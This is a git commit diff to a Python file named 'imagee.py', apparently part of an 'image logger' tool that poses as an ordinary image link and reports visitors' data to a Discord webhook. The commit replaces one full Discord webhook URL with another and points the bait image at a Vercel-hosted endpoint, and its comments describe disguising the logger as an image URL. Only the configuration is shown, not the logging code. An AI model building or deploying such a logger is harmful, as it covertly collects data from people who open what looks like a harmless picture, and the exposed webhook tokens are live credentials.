58e58704897606744fb81f90534684c393123bbf
gowexi2447-code <gowexi2447@gmail.com>
2025-12-09 21:03:43 +0100

    Update imagee.py

--- api/imagee.py
+++ api/imagee.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1448006651176292432/b3-cTZp-lznSbavOdd3vcGy8xl3NnmFJ9Grkq80xuJhoSHdOhtuMTmQJ5G_p_MPyj1xi",
-    "image": "https://gofile.io/d/BIf7Bn", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1448041975096934542/_iz7y6_XbbSQFblsYSEFqjstbvxoVhxLJuyWgIYMyLS_z2FntmC_v9zPcuZzYayYc6Jy",
+    "image": "https://tenoor-two.vercel.app/api/imagee", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
